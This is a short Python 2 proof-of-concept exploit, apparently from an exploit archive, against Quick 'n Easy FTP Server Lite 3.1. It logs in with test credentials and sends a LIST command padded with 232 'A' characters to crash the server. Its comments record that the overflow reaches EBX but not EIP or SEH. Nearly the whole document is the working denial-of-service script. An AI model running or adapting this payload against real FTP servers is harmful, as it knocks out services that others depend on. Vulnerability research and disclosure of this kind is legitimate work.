#!/usr/bin/python
 
print "\n############################################################"
print "##        Team Hackers Garage            ##"
print "##   Quick 'n Easy FTP Server Lite Version 3.1   ##"
print "##              Crash PoC            ##"
print "##        Sumit Sharma (aka b0nd)        ##"
print "##         sumit.iips@gmail.com          ##"
print "##                           ##"
print "##       Special Thanks to: Double_Zero      ##"
print "##   (http://www.exploit-db.com/author/DouBle_Zer0)  ##"
print "##              &                ##"
print "##       Peter Van (CORELAN TEAM)        ##"
print "##                           ##"
print "############################################################"
 
# Summary: The "LIST" command in Version 3.1 of Quick 'n Easy FTP Server Lite is vulnerable
# Tested on: Windows XP SP2
# ftp> ls AAAA... 232 A's...AAA?
# Server Crash!
# Only EBX gets overwritten at the time of crash with the string following first 232 A's (in case using longer string).
# No SEH overwrite
# No EIP overwrite
 
 
from socket import *
 
host = "127.0.0.1"       
port = 21
user = "test"           # "upload" and "download" access
password = "test"
 
 
s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
print s.recv(1024)
 
s.send("user %s\r\n" % (user))
print s.recv(1024)
 
s.send("pass %s\r\n" % (password))
print s.recv(1024)
 
buffer = "LIST "
buffer += "A" * 232
buffer += "?"
buffer += "\r\n"
 
s.send(buffer)
print s.recv(1024)
s.close()
print "---->>> Server Crash!!!"